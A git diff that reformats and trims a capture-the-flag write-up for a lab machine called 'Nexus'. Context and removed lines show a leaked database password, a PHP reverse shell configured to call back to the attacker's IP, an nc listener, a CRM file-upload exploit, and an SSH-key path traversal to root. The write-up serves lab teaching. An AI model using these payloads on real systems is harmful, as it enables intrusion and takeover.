@@ -23,6 +23,8 @@ Nexus is a solid easy-rated box that chains together credential leakage through 
 | User (jones)        | Password reuse of the leaked database credential                                                                                                                      |
 | Root                | Path traversal in a root-owned `systemd` timer (`template-sync.py`) via a crafted Gitea template repository, used to plant an SSH key in `/root/.ssh/authorized_keys` |
 
+---
+
 # Machine Information:
 
 <BoxInfoCard
@@ -103,13 +105,13 @@ This uncovered two additional virtual hosts: `git.nexus.htb` and `billing.nexus.
 
 ## billing.nexus.htb
 
-Navigating to `billing.nexus.htb` revealed a Krayin CRM login page. Without valid credentials at this point, I moved on to the Git instance to see if it exposed anything useful.
+`billing.nexus.htb` revealed a Krayin CRM login page. Without valid credentials at this point, I moved on to the Git instance to see if it exposed anything useful.
 
 ![Krayin CRM login page on billing.nexus.htb](/static/images/nexus/image%201.png)
 
 ## git.nexus.htb
 
-The Gitea instance had public browsing enabled. Under the Explore tab I found a single repository, `admin/krayin-docker-setup`, and two registered users: `admin` and `jones`.
+Under the Explore tab I found a single repository, `admin/krayin-docker-setup`, and two registered users: `admin` and `jones`.
 
 ![Gitea Explore page showing the admin/krayin-docker-setup repository](/static/images/nexus/image%202.png)
 
@@ -123,19 +125,11 @@ Reviewing the commit history, I found that commit `9b817fa4e0` had exposed crede
 
 ![Commit history of the krayin-docker-setup repository](/static/images/nexus/image%205.png)
 
-The diff showed a change to the application URL and, critically, the removal of a database password from the `.env` file:
-
-```diff
-- APP_URL=http://nexus.htb
-+ APP_URL=http://billing.nexus.htb
-...
-- DB_PASSWORD=N27xh!!2ucY04
-+ DB_PASSWORD=
-```
-
 Combining this leaked password with the email address I found earlier (`j.matthew@nexus.htb`), I was able to authenticate to `billing.nexus.htb`.
 
-# Gaining a Foothold
+---
+
+# Initial Foothold
 
 ## Authenticating to Krayin CRM
 
@@ -153,16 +147,7 @@ A quick search for known vulnerabilities in this version turned up a critical ar
 
 ![Google search results for Krayin version 2.2.0 vulnerabilities](/static/images/nexus/image%208.png)
 
-- **CVE-2026-38526** — Arbitrary File Upload leading to RCE (CVSS 9.9)
-- **Type:** Unrestricted Upload of File with Dangerous Type (CWE-434)
-- **Endpoint:** `/admin/tinymce/upload`
-- **Details:** An authenticated user can upload a crafted PHP file through the TinyMCE rich-text editor upload component and execute arbitrary code on the underlying server.
-
-I located a public proof-of-concept exploit on GitHub:
-
-```
-https://github.com/sh3llc0d3-0x15/CVE-2026-38526-Exploit
-```
+I located a public proof-of-concept exploit on GitHub: https://github.com/sh3llc0d3-0x15/CVE-2026-38526-Exploit
 
 ### Setting Up the Exploit
 
@@ -193,59 +178,10 @@ options:
   --insecure            disable tls certificate verification
 ```
 
-Since the exploit required a payload file, I used the classic PHP reverse shell from `pentestmonkey`, updating the `$ip` and `$port` variables to point back to my attacking machine:
-
-```
-https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
-```
+Since the exploit required a payload file, I used the classic PHP reverse shell from `pentestmonkey`, updating the `$ip` and `$port` variables to point back to my attacking machine: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
 
 ```php:php-rce-shell.php
 <?php
-// php-reverse-shell - A Reverse Shell implementation in PHP
-// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
-//
-// This tool may be used for legal purposes only.  Users take full responsibility
-// for any actions performed using this tool.  The author accepts no liability
-// for damage caused by this tool.  If these terms are not acceptable to you, then
-// do not use this tool.
-//
-// In all other respects the GPL version 2 applies:
-//
-// This program is free software; you can redistribute it and/or modify
-// it under the terms of the GNU General Public License version 2 as
-// published by the Free Software Foundation.
-//
-// This program is distributed in the hope that it will be useful,
-// but WITHOUT ANY WARRANTY; without even the implied warranty of
-// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-// GNU General Public License for more details.
-//
-// You should have received a copy of the GNU General Public License along
-// with this program; if not, write to the Free Software Foundation, Inc.,
-// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
-//
-// This tool may be used for legal purposes only.  Users take full responsibility
-// for any actions performed using this tool.  If these terms are not acceptable to
-// you, then do not use this tool.
-//
-// You are encouraged to send comments, improvements or suggestions to
-// me at pentestmonkey@pentestmonkey.net
-//
-// Description
-// -----------
-// This script will make an outbound TCP connection to a hardcoded IP and port.
-// The recipient will be given a shell running as the current user (apache normally).
-//
-// Limitations
-// -----------
-// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
-// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
-// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
-//
-// Usage
-// -----
-// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
-
 set_time_limit (0);
 $VERSION = "1.0";
 $ip = '10.10.16.82';  // CHANGE THIS
@@ -406,8 +342,7 @@ payload path available at: http://billing.nexus.htb/storage/tinymce/7126b7043c12
 verify execution via web request or listener.
 ```
 
-I started a listener and triggered the uploaded payload by requesting the returned path:
-Visiting `http://billing.nexus.htb/storage/tinymce/7126b7043c1212ad9553f29e71b3ded8.php` in the browser fired the shell back to my listener.
+I started a listener and triggered the payload by requesting the returned path: `http://billing.nexus.htb/storage/tinymce/7126b7043c1212ad9553f29e71b3ded8.php` in the browser fired the shell back to my listener.
 
 ```bash
 bukhari@ubuntu-VM % nc -nvlp 1234
@@ -436,7 +371,9 @@ bukhari@ubuntu-VM % stty raw -echo; fg
 www-data@nexus:/$
 ```
 
-# Privilege Escalation: www-data → jones
+---
+
+# Privilege Escalation
 
 Enumerating the home directory, I found two folders: `html` and `krayin`.
 
@@ -518,6 +455,8 @@ cat user.txt
 9994474981412a0ae6bc50528758bebc
 ```
 
+---
+
 # Privilege Escalation: jones → root
 
 ## Enumeration
@@ -556,19 +495,6 @@ cat /etc/systemd/system/gitea-template-sync.timer
 
 ![Contents of the gitea-template-sync.timer unit file](/static/images/nexus/image%2015.png)
 
-```ini
-[Unit]
-Description=Run Gitea template sync every minute
-
-[Timer]
-OnBootSec=1min
-OnUnitActiveSec=1min
-Unit=gitea-template-sync.service
-
-[Install]
-WantedBy=timers.target
-```
-
 This timer fires every minute and triggers `gitea-template-sync.service`. The corresponding service file revealed it runs as **root**.
 
 ```bash
@@ -576,18 +502,6 @@ cat /etc/systemd/system/gitea-template-sync.service
 ```
 
 ![Contents of the gitea-template-sync.service unit file, showing it runs as root](/static/images/nexus/image%2016.png)
-
-```ini
-[Unit]
-Description=Sync Gitea templates
-After=network-online.target
-
-[Service]
-Type=oneshot
-User=root
-ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py
-TimeoutStartSec=50s
-```
 
 ## Analyzing template-sync.py
 
@@ -824,11 +738,7 @@ open(os.path.join(".git","refs","heads","main"),"w").write(sha+"\n")
 print("Done: "+sha)
 ```
 
-The crafted tree places the public key at `authorized_keys` using a relative path traversal of the form:
-
-```
-../../../../root/.ssh/authorized_keys
-```
+The crafted tree places the public key at `authorized_keys` using a relative path traversal of the form: `../../../../root/.ssh/authorized_keys`
 
 The script constructs the blob, builds the nested tree objects, writes a commit pointing at the top-level tree, and updates `refs/heads/main` accordingly — all using raw Git object construction (`hashlib.sha1`, `zlib.compress`) so that `git ls-tree` on the server returns the traversal path verbatim.
 
